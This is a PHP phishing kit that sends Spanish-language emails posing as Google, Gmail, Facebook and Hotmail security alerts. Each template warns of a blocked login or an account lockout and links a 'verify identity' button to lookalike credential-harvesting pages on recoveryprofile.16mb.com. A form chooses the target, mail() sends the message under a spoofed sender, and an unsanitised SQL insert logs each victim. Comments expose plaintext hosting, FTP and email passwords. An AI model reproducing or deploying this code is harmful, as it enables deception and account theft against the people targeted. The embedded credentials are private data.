<?php require_once('../../conexion.php');
require_once("seguridad.php");
?>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
<style type="text/css">
p { 
  font: 13px arial,sans-serif;

}
  

</style>
</head>

<?php 

/*
googles.esy.es
http://cpanel.hostinger.es
u806923779_admin  usuario mysql
u806923779
TjQ5dysCyA cpanel


Dirección de Email: serverprueba123@gmail.com
Contraseña: serverserver123

*/
  if(isset($_POST['Action']) && $_POST['Action']!='')
	{ 

 
$time = time();
$date=date("D-m-Y (H:i:s a)", $time);
$to      = $_POST['EMAIL'].$_POST['type'];
$subject = 'Bloqueo Cuenta Gmail'; 
$name      = $_POST['NAME'];

echo $message_gmail_2 = '

<div style="padding:30px;width: 500px;">
<img src="http://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Logo_Google_2013_Official.svg/250px-Logo_Google_2013_Official.svg.png" width="140" >

  <div  id="conten" name="conten" style="width: 500px;border:1px solid #000; padding:15px;";   >
    <p>Hola,</p>

<p>Te recordamos que aún no haz realizado la sincronización completa entre tu equipo Android  <span style="color:#1155CC">(CLARO AX650) </span> y tu cuenta de Google <span style="color:#1155CC"> <a href="'.$to.'">['.$to.']</a></span>. </p>

<p>Por esta razón y estableciendo las nuevas políticas de uso y privacidad de Alphabet Inc. para Android y todos los productos Google deberás realizar este proceso antes del 05 de Septiembre del presente año.</p>
 

<p>
De no realizar esta sincronización, tu dispotitivo movil sera bloqueado de forma permanente por parte de tu operador.
</p>
<p>
	<button style="border-radius:2px;  border: 1px solid #3079ed;background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed); padding:8px; color:white; font-weight:bold;">
<a href="https://support.google.com/mail?vid=1-635769820316142338-3827980648#topic=3394212" style="text-decoration:none;color:white;">Información Adicional</a>
	</button>
 
<p>
Atentamente,
El equipo de Cuentas de Google
</p>

  </div>

<p style=" font: 12px arial,sans-serif;color:#403E3A">Esta dirección de correo electrónico no admite respuestas. Para obtener más información, visita el Centro de ayuda de Cuentas de Google.
</br>
© 2015 Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
</p>
</div> ';


$message_gmail_1 = '

<div style="padding:30px;width: 500px;">
<img src="http://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Logo_Google_2013_Official.svg/250px-Logo_Google_2013_Official.svg.png" width="140" >

  <div  id="conten" name="conten" style="width: 500px;border:1px solid #000; padding:15px;";   >
    <p>Hola,</p>

<p>Recientemente hemos bloqueado un intento de inicio de sesión en tu cuenta de Google <span style="color:#1155CC"> <a href="'.$to.'">['.$to.']</a></span>. </p>

<p><b>Detalles del intento de inicio de sesión</b> </p>
<p>
Fecha y hora: '. date("D d M Y h:i a e") .'  </p>
<p>Ubicación: Ibagué, Tolima, Colombia </br>
</p>

<p>
<b>Si no has sido tú</b> </br>
Revisa la página Actividad de la cuenta en la dirección:
</p>
<p>
	<button style="border-radius:2px;  border: 1px solid #3079ed;background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed); padding:8px; color:white; font-weight:bold;">
<a href="http://recoveryprofile.16mb.com/recovery.livepass&asdfsdfadfasdfasdf.php" style="text-decoration:none;color:white;">Verifica tú identidad</a>
	</button>

</p>
 <p>
para ver si algo te parece sospechoso.</p> 
<p>
<b>Si has sido tú</b> </br>
Puedes utilizar una aplicación de Google como Gmail para acceder a tu cuenta (opción recomendada) o bien cambiar la configuración en la dirección <a href="https://www.google.com/settings/security/lesssecureapps">https://www.google.com/settings/security/lesssecureapps</a>  para que tu cuenta ya no esté protegida con los estándares de seguridad modernos. 
</p>
<p>
Para obtener más información, consulta <a href="https://support.google.com/accounts/answer/6009563">https://support.google.com/accounts/answer/6009563</a>. 
</p>
<p>
Atentamente,
El equipo de Cuentas de Google
</p>

  </div>

<p style=" font: 12px arial,sans-serif;color:#403E3A">Esta dirección de correo electrónico no admite respuestas. Para obtener más información, visita el Centro de ayuda de Cuentas de Google.
</br>
© 2014 Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
</p>
</div> ';

$message_facebook='

<div style="padding:30px;width: 500px;">

<div style="width: 532px;background:#3b5998;">
	<img src="http://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Facebook.svg/2000px-Facebook.svg.png" width="110px" >
</div>
  <div  id="conten" name="conten" style="width: 500px;border:1px solid #000; padding:15px;";   >
    <p>Hola,</p>

<p>Recientemente hemos bloqueado un intento de inicio de sesión en tu cuenta de Facebook.</p>

<p><b>Detalles del intento de inicio de sesión</b> </p>
<p>Sistema Operativo: Android Phone  </p>
<p>Fecha y hora: '. date(" d M Y h:i a e") .'  </p>
<p>Ubicación: Bogota, DC, CO (IP=192.168.65.250) </br>
</p>
<p>
	Nota: Dicha localización es basada en el proveedor de servicio de internet.
</p>

<p>
<b>Si no has sido tú</b> </br>
Ingresa al siguiente enlace para verificar tu identidad:
</p>
<p>
	<button style="border-radius:2px;  border: 1px solid #3b5998;background-color: #3b5998; padding:8px; color:white; font-weight:bold;">
<a href="http://recoveryprofile.16mb.com/acessloginfacemailrecoveryasfdasdfadsfasd.php" style="text-decoration:none;color:white;">Verifica identidad</a>
	</button>

</p>
 <p>
De lo contrario, de seguirse presentando accesos sospechosos a tu cuenta esta será <b>bloqueada en las siguientes 24 horas.</b></p> 
<p>
<b>Si has sido tú</b> </br>
 Por favor descarta este correo.
 </p>
<p>
Para obtener más información, consulta <a href="https://www.facebook.com/settings?tab=security">Seguridad de tu cuenta</a>. 
</p>
<p>
Atentamente,
Grupo de seguridad de Facebook.
</p>

  </div>

<p style=" font: 12px arial,sans-serif;color:#403E3A">Esta dirección de correo electrónico no admite respuestas. Para obtener más información, visita el Centro de ayuda de Cuentas de Facebook.
</br>
© 2014 Facebook Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
</p>
</div>


';
   $message_hotmail = '

<div style="padding:30px;width: 500px;">
<img src="http://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Logo_Google_2013_Official.svg/250px-Logo_Google_2013_Official.svg.png" width="140" >

  <div  id="conten" name="conten" style="width: 500px;border:1px solid #000; padding:15px;";   >
    <p>Hola ' .$name.', </p>

<p>Recientemente hemos bloqueado multiples intentos de inicio de sesi&oacute;n en tu cuenta de Google, por lo cual enviamos este correo a tu cuenta de respaldo. <span style="color:#1155CC"> <a href="'.$to.'">['.$to.']</a></span>. </p>

<p><b>Detalles del intento de inicio de sesi&oacute;n</b> </p>
<p>
Fecha y hora: '. date("d M Y h:i a e") .'  </p>
<p>Ubicaci&oacute;n: Ibagu&eacute;, Tolima, Colombia </br>
<p>Dispositivo: Samsung - Android (IP=186.115.227.77) </br>
</p>

<p>
<b>Si no has sido t&uacute;</b> </br>
Es importante comprobar tu identidad:
</p>
<p>
	<button style="border-radius:2px;  border: 1px solid #3079ed; background-color:#166BEB;   color:white; font-weight:bold;">
<a href="http://recoveryprofile.16mb.com/recovery.livepass&asdfsdfadfasdfasdf.php" style="text-decoration:none;color:white;">Verifica t&uacute; identidad</a>
	</button>

</p>
 <p>
De lo contrario y de seguir la actividad sospechosa en tu cuenta Google durante las proximas 24 horas esta ser&aacute; bloqueada de forma permanente afectando todos los dispositivos m&oacute;viles (Android) asociados a la misma.</p> 
<p>
<b>Si has sido t&uacute;</b> </br>
Puedes utilizar una aplicaci&oacute;n de Google como Gmail para acceder a tu cuenta (opci&oacute;n recomendada) o bien cambiar la configuraci&oacute;n en la direcci&oacute;n <a href="https://www.google.com/settings/security/lesssecureapps">https://www.google.com/settings/security/lesssecureapps</a>  para que tu cuenta ya no est&eacute; protegida con los est&aacute;ndares de seguridad modernos. 
</p>
<p>
Para obtener m&aacute;s informaci&oacute;n, consulta <a href="https://support.google.com/accounts/answer/6009563">https://support.google.com/accounts/answer/6009563</a>. 
</p>
<p>
Atentamente,
El equipo de Cuentas de Google
</p>

  </div>

<p style=" font: 12px arial,sans-serif;color:#403E3A">Esta direcci&oacute;n de correo electr&oacute;nico no admite respuestas. Para obtener m&aacute;s informaci&oacute;n, visita el Centro de ayuda de Cuentas de Google.
</br>
© 2014 Google Inc., 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
</p>
</div> ';  

switch ($_POST['type']) {
	case '@facebook.com':
		$message=$message_facebook;
		break;
	
	case '@gmail.com':
		$message=$message_gmail_2;
		break;

	case '@hotmail.com':
		$message=$message_hotmail;
		break;

	case '@outlook.com':
		$message=$message_hotmail;
		break;

	case '':
		$message=$message_facebook;
		break;

}

echo $message; 

 
//para el envío en formato HTML 
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n"; 

//dirección del remitente 
$headers .= "From:  Alerta de seguridad <security@accounts.com>\r\n"; 

//dirección de respuesta, si queremos que sea distinta que la del remitente 
$headers .= "Reply-To: security@accounts.com\r\n"; 

//ruta del mensaje desde origen a destino 
$headers .= "Return-path: security@accounts.com\r\n"; 

//direcciones que recibián copia 
$headers .= "Cc: security@accounts.com\r\n"; 

//direcciones que recibirán copia oculta 
$headers .= "Bcc: security@accounts.com\r\n";

mail($to,$subject,$message,$headers) ;





 $email=$_POST['EMAIL'].$_POST['type'];
$sel="INSERT INTO send (
ID ,
EMAIL ,
FECHA,
HORA
)
VALUES (
NULL ,  
'$email',  
'$f',
'$h'
);
";
$query = mysql_query($sel);


 echo '
		<script languaje="javascript">
		alert("Se Han enviado correctamente a '.$to.' ");

		history.back();

		</script> ';
}


?>
<!DOCTYPE html>
<html>
<head>
	<title>Gmail</title>
</head>
<body>
<div id="content" style="padding:10px;">
<form method="post" action="mail.php">
<input type="text" id="NAME"  name="NAME" placeholder="Nombre Persona" >	 
<input type="text" id="EMAIL"  name="EMAIL" placeholder="Email" >	
<select name="type" id="type">
	<option value=""></option>
	<option value="@gmail.com">Gmail</option>
	<option value="@facebook.com">Facebook</option>
	<option value="@hotmail.com">Hotmail</option>
	<option value="@outlook.com">Outlook</option>
</select>
<button type="submit" id="insertar" id="insertar">Enviar</button>
<input  type="hidden" name="Action" value="Save">
</form>
</div>
</body>
</html>
<?php 
/*


Plan de Hosting: Gratis
Dominio: googles.esy.es
Dirección IP: 31.220.16.170

Detalles para el Inicio de Sesión en el Panel de Control

Dirección de Email: serverprueba123@gmail.com
Contraseña: ••••••••••

URL del Panel de Control: http://cpanel.hostinger.es

Información del Servidor

Nombre del Servidor: server58.hostinger.es
IP del Servidor: 185.28.20.18

Si estás usando un nombre de dominio existente con tu nueva cuenta de hosting, necesitas actualizar los nameservers para apuntar a los nameservers mostrados a continuación.

Nameserver 1: ns1.hostinger.es 31.170.163.241
Nameserver 2: ns2.hostinger.es 31.220.23.1
Nameserver 3: ns3.hostinger.es 173.192.183.247
Nameserver 4: ns4.hostinger.es 31.170.164.249

Cargando Tu Sitio

Puedes usar una de las direcciones mostradas a continuación para administrar tu sitio:

Nombre de Host FTP Temporal: 31.220.16.170
Nombre de Host FTP completo: ftp.googles.esy.es
Usuario FTP: u806923779
Contraseña FTP: TjQ5dysCyA

Debes cargar tus archivos a la carpeta public_html!

Configuraciones de Email

Para las cuentas que configures, deberás usar los siguientes detalles de conexión en tu programa de email:

Dirección de Host POP3: mx1.hostinger.es
Dirección de Host SMTP: mx1.hostinger.es
Usuario: La dirección de correo que estás chequeando
Contraseña: La especificada cuando creaste el correo


CORREO
no-reply@recoveryprofile.16mb.com
serverserver123




Gracias por elegirnos.
*/







 ?>
 